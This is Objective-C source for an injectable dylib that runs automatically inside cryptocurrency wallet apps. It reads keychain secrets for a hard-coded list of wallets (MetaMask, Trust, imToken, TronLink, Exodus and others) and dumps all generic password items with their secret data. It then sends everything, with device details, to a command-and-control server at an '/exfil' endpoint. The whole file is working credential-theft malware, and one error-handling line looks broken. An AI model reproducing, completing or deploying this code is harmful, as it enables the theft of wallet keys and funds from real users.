// ═══════════════════════════════════════════════════════════════════════
// kcold.c / kcold.m — 钱包进程内钥匙串转储 dylib
// 编译: 见同目录 Makefile（macOS + Xcode Command Line Tools）
// 用法: 由 Core 作为 payload 载入目标钱包进程（bundleId 命中即注入）
//       也可以用 kc_inject 的远程线程 dlopen 载入
// 原理: 注入到钱包进程后，本进程持有该 App 的钥匙串访问权限，
//       用 SecItemCopyMatching 读自身 access group 下的项，无需 root。
// 上报: POST 到 {C2}/exfil，字段与前台上报一致
// 20261108
// ═══════════════════════════════════════════════════════════════════════
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#include <sys/utsname.h>

static NSString *const kC2Base = @"https://c2.usdt789.cc";

static NSString *b64(NSData *d) {
    return [d base64EncodedStringWithOptions:0];
}

static void postJSON(NSString *path, NSDictionary *body) {
    NSString *url = [kC2Base stringByAppendingString:path];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    NSData *payload = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    req.HTTPBody = payload;
    NSURLSessionDataTask *t = [[NSURLSession sharedSession] dataTaskWithRequest:req];
    [t resume];
}

// ── 读取指定 service 的所有钥匙串项 ──
static NSArray *dumpService(NSString *service) {
    NSMutableArray *out = [NSMutableArray array];
    NSDictionary *q = @{
        (__bridge id)kSecClass:            (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService:      service,
        (__bridge id)kSecReturnData:       @YES,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecMatchLimit:       (__bridge id)kSecMatchLimitAll,
    };
    CFTypeRef result = NULL;
    OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)q, &result);
    if (st != errSecSuccess || !result) {
        out[0] = nil;
        return @[ @{@"service": service, @"status": @(st)} ];
    }
    NSArray *items = (__bridge_transfer NSArray *)result;
    for (NSDictionary *it in items) {
        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        row[@"service"] = service;
        if (it[(__bridge id)kSecAttrAccount]) row[@"account"] = it[(__bridge id)kSecAttrAccount];
        if (it[(__bridge id)kSecAttrAccessGroup]) row[@"agrp"] = it[(__bridge id)kSecAttrAccessGroup];
        if (it[(__bridge id)kSecAttrLabel]) row[@"label"] = it[(__bridge id)kSecAttrLabel];
        NSData *d = it[(__bridge id)kSecValueData];
        if (d) {
            row[@"data_b64"] = b64(d);
            NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
            if (s && s.length && s.length < 512) row[@"data_text"] = s;
        }
        [out addObject:row];
    }
    return out;
}

// ── 枚举本 App 所有 generic password 项（不按 service 过滤）──
static NSArray *dumpAll(void) {
    NSMutableArray *out = [NSMutableArray array];
    NSDictionary *q = @{
        (__bridge id)kSecClass:            (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecReturnData:       @YES,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecMatchLimit:       (__bridge id)kSecMatchLimitAll,
    };
    CFTypeRef result = NULL;
    OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)q, &result);
    if (st != errSecSuccess || !result) {
        return @[ @{@"all_status": @(st)} ];
    }
    NSArray *items = (__bridge_transfer NSArray *)result;
    for (NSDictionary *it in items) {
        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        if (it[(__bridge id)kSecAttrService]) row[@"service"] = it[(__bridge id)kSecAttrService];
        if (it[(__bridge id)kSecAttrAccount]) row[@"account"] = it[(__bridge id)kSecAttrAccount];
        if (it[(__bridge id)kSecAttrAccessGroup]) row[@"agrp"] = it[(__bridge id)kSecAttrAccessGroup];
        NSData *d = it[(__bridge id)kSecValueData];
        if (d) {
            row[@"data_b64"] = b64(d);
            NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
            if (s && s.length && s.length < 512) row[@"data_text"] = s;
        }
        [out addObject:row];
    }
    return out;
}

__attribute__((constructor))
static void kcold_init(void) {
    @autoreleasepool {
        NSBundle *b = [NSBundle mainBundle];
        NSString *bid = [b bundleIdentifier] ?: @"unknown";
        NSDictionary *info = [b infoDictionary] ?: @{};
        struct utsname u; uname(&u);

        NSMutableArray *services = [NSMutableArray array];
        for (NSString *s in @[
                 @"com.consenlabs.token", @"com.senlabs.imtoken",
                 @"com.global.wallet.ios", @"com.tronlink.hdwallet",
                 @"com.sixdays.trust", @"io.metamask.MetaMask",
                 @"com.bitpie.wallet", @"com.bitkeep.os",
                 @"org.toshi.distribution", @"exodus-movement.exodus"] ) {
            [services addObject:s];
        }
        // 从 Info.plist 里再挖 keychain group 提示
        for (NSString *k in info) {
            if ([k.lowercaseString containsString:@"keychain"] || [k.lowercaseString containsString:@"group"]) {
                id v = info[k];
                if ([v isKindOfClass:[NSString class]]) [services addObject:v];
            }
        }

        NSMutableDictionary *res = [NSMutableDictionary dictionary];
        res[@"bundleId"] = bid;
        res[@"name"] = info[@"CFBundleName"] ?: @"";
        res[@"machine"] = [NSString stringWithUTF8String:u.machine] ?: @"";
        res[@"kernel"] = [NSString stringWithUTF8String:u.version] ?: @"";

        NSMutableArray *byService = [NSMutableArray array];
        for (NSString *s in services) {
            [byService addObjectsFromArray:dumpService(s)];
        }
        res[@"by_service"] = byService;
        res[@"all_items"] = dumpAll();

        postJSON(@"/exfil", @{@"type": @"kcold", @"device": bid, @"data": res});
    }
}
